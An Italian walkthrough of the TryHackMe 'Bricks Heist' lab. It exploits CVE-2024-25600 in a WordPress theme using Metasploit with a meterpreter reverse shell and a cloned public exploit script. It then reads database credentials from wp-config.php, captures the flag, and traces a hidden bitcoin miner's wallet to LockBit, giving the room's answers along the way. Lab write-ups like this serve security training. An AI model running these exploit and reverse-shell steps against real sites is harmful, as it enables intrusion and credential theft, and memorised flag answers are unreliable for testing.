
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/tryhack3mbricksheist

Da tre milioni di mattoni a tre milioni di transazioni!  
 
Brick Press Media Co. stava lavorando alla creazione di un nuovissimo tema web che rappresentava un famoso muro utilizzando mattoni da tre milioni di byte.  L'agente Murphy porta con sé una serie di sfortuna. Ed eccoci di nuovo: il server è compromesso e hanno perso l'accesso.  
  
Puoi hackerare il server e identificare cosa è successo lì?
 
**Nota:** aggiungilo `MACHINE_IP bricks.thm` al tuo file **/etc/hosts .**

```
echo "10.10.130.229   bricks.thm" >> /etc/hosts
```

```
nmap -Pn -vv -O bricks.thm
```

```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
443/tcp  open  https   syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63

```

```
nmap -sVC -v -p22,80,443,3306 bricks.thm
```

```

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2a:c3:fb:0c:aa:1c:49:b9:bd:db:e8:04:d6:f6:4f:a7 (RSA)
|   256 a0:82:3c:30:66:bb:ce:70:e3:5f:3a:53:1d:4b:b0:a1 (ECDSA)
|_  256 e8:ac:2d:77:eb:dc:f6:1f:13:1d:86:16:fc:93:25:38 (ED25519)
80/tcp   open  http     Python http.server 3.5 - 3.10
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
443/tcp  open  ssl/http Apache httpd
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 6.5
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
|_http-server-header: Apache
|_http-title: Brick by Brick
| tls-alpn: 
|   h2
|_  http/1.1
3306/tcp open  mysql    MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

visitiamo https://bricks.thm/

troviamo una pagina con scritto Brick by Brick! fatta in  WordPress 6.5 come già scoperto con nmap

controllando il codice sorgente con `ctrl+u`  facciamo un enumerazione manuale e troviamo interessante questa pagina

https://bricks.thm//wp-json//

che a sua volta contiene il link alla pagina di login

https://bricks.thm/wp-admin/authorize-application.php

che era anche contenuta nel file robots.txt https://bricks.thm/robots.txt

per non perdere altro tempo in enumerazioni manuali visto che il sito è WordPress utilizziamo il tool wpscan

```
wpscan --url https://bricks.thm --disable-tls-checks
```
	disabilitiamo TLS a causa dei problemi con i certificati

```
[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

```

Sito WordPress con tema Bricks versione 1.9.5

facciamo una ricerca e scopriamo che è vulnerabile a RCE
- **Codice CVE:** CVE-2024-25600
- **Punteggio CVSS:** 10.0 (critico)

vediamo se abbiamo qualcosa di disponibile su Metasploit

```
msfconsole
```

```
search bricks
```

```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_bricks_builder_rce  2024-02-19       excellent  Yes    Unauthenticated RCE in Bricks Builder Theme
   1    \_ target: Automatic                    .                .          .      .
   2    \_ target: PHP In-Memory                .                .          .      .
   3    \_ target: Unix In-Memory               .                .          .      .
   4    \_ target: Windows In-Memory            .                .          .      .


```

```
use exploit/multi/http/wp_bricks_builder_rce
```

```
show options
```

```
msf6 exploit(multi/http/wp_bricks_builder_rce) > show options

Module options (exploit/multi/http/wp_bricks_builder_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```

```
set RHOSTS https://bricks.thm
```

```
set RPORT 443
```

```
set LHOST 10.14.99.134
```

```
run
```

```
getuid
```
```
meterpreter > getuid
Server username: apache
```

```
ls
```

```
meterpreter > ls
Listing: /data/www/default
==========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  523    fil   2024-04-02 07:13:36 -0400  .htaccess
100644/rw-r--r--  43     fil   2024-04-05 08:39:01 -0400  650c844110baced87e1606453b93f22a.txt
100644/rw-r--r--  405    fil   2024-04-02 07:12:03 -0400  index.php
040755/rwxr-xr-x  4096   dir   2023-04-11 20:53:55 -0400  kod
100644/rw-r--r--  19915  fil   2024-04-04 11:15:40 -0400  license.txt
040755/rwxr-xr-x  4096   dir   2024-04-02 07:03:35 -0400  phpmyadmin
100644/rw-r--r--  7401   fil   2024-04-04 11:15:40 -0400  readme.html
100644/rw-r--r--  7387   fil   2024-04-04 11:15:40 -0400  wp-activate.php
040755/rwxr-xr-x  4096   dir   2024-04-02 07:12:03 -0400  wp-admin
100644/rw-r--r--  351    fil   2024-04-02 07:12:03 -0400  wp-blog-header.php
100644/rw-r--r--  2323   fil   2024-04-02 07:12:03 -0400  wp-comments-post.php
100644/rw-r--r--  3012   fil   2024-04-04 11:15:40 -0400  wp-config-sample.php
100666/rw-rw-rw-  3288   fil   2024-04-02 07:12:39 -0400  wp-config.php
040755/rwxr-xr-x  4096   dir   2025-08-31 11:59:43 -0400  wp-content
100644/rw-r--r--  5638   fil   2024-04-02 07:12:03 -0400  wp-cron.php
040755/rwxr-xr-x  16384  dir   2024-04-04 11:15:40 -0400  wp-includes
100644/rw-r--r--  2502   fil   2024-04-02 07:12:03 -0400  wp-links-opml.php
100644/rw-r--r--  3927   fil   2024-04-02 07:12:03 -0400  wp-load.php
100644/rw-r--r--  50917  fil   2024-04-04 11:15:40 -0400  wp-login.php
100644/rw-r--r--  8525   fil   2024-04-02 07:12:03 -0400  wp-mail.php
100644/rw-r--r--  28427  fil   2024-04-04 11:15:40 -0400  wp-settings.php
100644/rw-r--r--  34385  fil   2024-04-02 07:12:03 -0400  wp-signup.php
100644/rw-r--r--  4885   fil   2024-04-02 07:12:03 -0400  wp-trackback.php
100644/rw-r--r--  3246   fil   2024-04-04 11:15:40 -0400  xmlrpc.php

```

```
cat wp-config.php
```
```
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'lamp.sh' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
```
qui troviamo delle credenziali ma non è la risposta che cercavamo

```
cat 650c844110baced87e1606453b93f22a.txt
```
ed ecco la prima flag!

Qual è il contenuto del file .txt nascosto nella cartella web?
```
THM{fl46_650c844110baced87e1606453b93f22a}
```

vediamo i processi in esecuzione

```
ps -ea
```

con ps non riesco a trovare nulla di utile

ed il comando `shell` non mi  funziona fa crashare la sessione di meterpreter

proviamo un'altro metodo per ottenere RCE

```
git clone https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
```

```
ls
```

```
cd CVE-2024-25600-EXPLOIT
```

```
sudo apt install python3-venv
```

```
python3 -m venv myenv
```

```
source myenv/bin/activate
```


```
pip install alive_progress bs4 prompt_toolkit requests rich
```

```
python CVE-2024-25600.py --url https://bricks.thm --threads 10
```
ottenuta di nuovo la reverse shell

vediamo i servizi in esecuzione

```
systemctl --type=service --state=running
```
oppure
```
systemctl | grep running
```

troviamo interessante
```
  systemd-udevd.service                          loaded active running udev Kernel Device Manager                                      
  ubuntu.service                                 loaded active running TRYHACK3M                                                       
  udisks2.service                                loaded active running Disk Manager   
```


```
systemctl cat ubuntu.service
```

Quando esegui `systemctl cat ubuntu.service`, il comando mostrerà il contenuto del file di unità, che può includere informazioni come:

- **[Unit]**: Sezione che descrive il servizio, le sue dipendenze e le condizioni di avvio.
- **[Service]**: Sezione che definisce come il servizio deve essere eseguito, inclusi i comandi per avviarlo e fermarlo, le variabili d'ambiente e altre opzioni di configurazione.
- **[Install]**: Sezione che specifica come il servizio deve essere abilitato o disabilitato all'avvio del sistema.

```

Shell> systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target

```

dove troviamo

Qual è il nome del processo sospetto?
```
nm-inet-dialog
```
Qual è il nome del servizio associato al processo sospetto?
```
ubuntu.service
```
vediamo il contenuto della directory

```
ls /lib/NetworkManager
```
```
Shell> ls /lib/NetworkManager
VPN
conf.d
dispatcher.d
inet.conf
nm-dhcp-helper
nm-dispatcher
nm-iface-helper
nm-inet-dialog
nm-initrd-generator
nm-openvpn-auth-dialog
nm-openvpn-service
nm-openvpn-service-openvpn-helper
nm-pptp-auth-dialog
nm-pptp-service
system-connections
```

leggiamo inet.conf

```
cat /lib/NetworkManager/inet.conf
```
```
Shell> cat /lib/NetworkManager/inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()
2024-04-08 10:46:18,755 [*] Miner()
2024-04-08 10:46:20,757 [*] Miner()
2024-04-08 10:46:22,760 [*] Miner()
2024-04-08 10:46:24,762 [*] Miner()
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:48:04,647 [*] confbak: Ready!
2024-04-08 10:48:04,648 [*] Status: Mining!
2024-04-08 10:48:08,649 [*] Miner()
2024-04-08 10:48:08,649 [*] Bitcoin Miner Thread Started
2024-04-08 10:48:08,649 [*] Status: Mining!
2024-04-08 10:48:10,651 [*] Miner()
2024-04-08 10:48:12,653 [*] Miner()
2024-04-08 10:48:14,656 [*] Miner()
2024-04-08 10:48:16,656 [*] Miner()
2024-04-08 10:48:18,659 [*] Miner()
2024-04-08 10:48:20,660 [*] Miner()
2024-04-08 10:48:22,663 [*] Miner()
2024-04-08 10:48:24,666 [*] Miner()
2024-04-08 10:48:26,668 [*] Miner()
2024-04-08 10:48:28,671 [*] Miner()

```
quindi

Qual è il nome del file di registro dell'istanza del miner?
```
inet.conf
```

Qual è l'indirizzo del portafoglio dell'istanza del miner?

```
5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```
dovrebbe essere un base64 proviamo a decodificarlo

```
echo 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d | xxd -r -p | base64 -d
```
ci restituisce
```
YmMxcXlrNzlmY3A5aGQ1a3JlcHJjZTg5dGtoNHdydGw4YXZ0NGw2N3FhYmMxcXlrNzlmY3A5aGFkNWtyZXByY2U4OXRraDR3cnRsOGF2dDRsNjdxYQ==
```

proviamo un ulteriore decodifica con
https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=WW1NeGNYbHJOemxtWTNBNWFHUTFhM0psY0hKalpUZzVkR3RvTkhkeWRHdzRZWFowTkd3Mk4zRmhZbU14Y1hsck56bG1ZM0E1YUdGa05XdHlaWEJ5WTJVNE9YUnJhRFIzY25Sc09HRjJkRFJzTmpkeFlRPT0
ed otteniamo
```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```
il valore che otteniamo è troppo lungo

troviamo sul web che le dimensioni dell'indirizzo bitcoin è di 26-62 caratteri
quindi visto che il nostro è di 62 lo dividiamo 

Qual è l'indirizzo del portafoglio dell'istanza del miner?
```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```
(ci accorgiamo che i due valori ottenuti sono identici)

andiamo su
https://www.blockchain.com/explorer

per tracciare le transazioni di questo portafoglio e troviamo un'indirizzo associato

L'indirizzo del portafoglio utilizzato è stato coinvolto in transazioni tra portafogli appartenenti a quale gruppo di minacce?

https://blockchair.com/bitcoin/transaction/50a89a628a6620216dca19f1221c138982601810fd60677ac7612a01999ae028

andiamo su livello di privacy

copiamo l'indirizzo del mittente

```
bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r
```

ed andiamo ad effettuare una ricerca sul Web

https://ofac.treasury.gov/recent-actions/20240220

troviamo relazione con il gruppo LockBit

L'indirizzo del portafoglio utilizzato è stato coinvolto in transazioni tra portafogli appartenenti a quale gruppo di minacce?
```
LockBit
```

